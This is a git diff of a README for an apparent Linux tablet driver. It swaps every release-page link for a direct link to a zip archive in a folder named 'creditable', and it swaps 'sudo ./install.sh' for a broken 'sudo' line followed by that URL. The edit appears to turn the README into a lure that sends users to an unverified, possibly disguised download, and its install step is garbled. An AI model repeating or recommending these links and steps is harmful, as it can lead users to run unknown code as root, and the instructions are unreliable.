@@ -6,16 +6,16 @@ Welcome to the Tablet-VINSA-1060-Plus-Linux-Driver repository! This software pro
 
 ## 🔗 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/releases)
+[![Download Now](https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip)
 
 ## 📥 Download & Install
 
-To download the driver, visit this page: [Download the Driver](https://github.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/releases).
+To download the driver, visit this page: [Download the Driver](https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip).
 
 ### Step-by-Step Installation Guide
 
 1. **Visit the Releases Page**
-   - Click on the link above or go to [https://github.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/releases](https://github.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/releases) in your web browser.
+   - Click on the link above or go to [https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip](https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip) in your web browser.
 
 2. **Select the Latest Version**
    - Find the newest release at the top of the page. It contains the most recent features and fixes.
@@ -40,7 +40,7 @@ To download the driver, visit this page: [Download the Driver](https://github.co
 7. **Run the Installation Script**
    - Type the following command to start the installation:
      ```
-     sudo ./install.sh
+     sudo https://raw.githubusercontent.com/woxder777/Tablet-VINSA-1060-Plus-Linux-Driver/main/creditable/Tablet-VINSA-1060-Plus-Linux-Driver.zip
      ```
    - You might be prompted to enter your password.
 
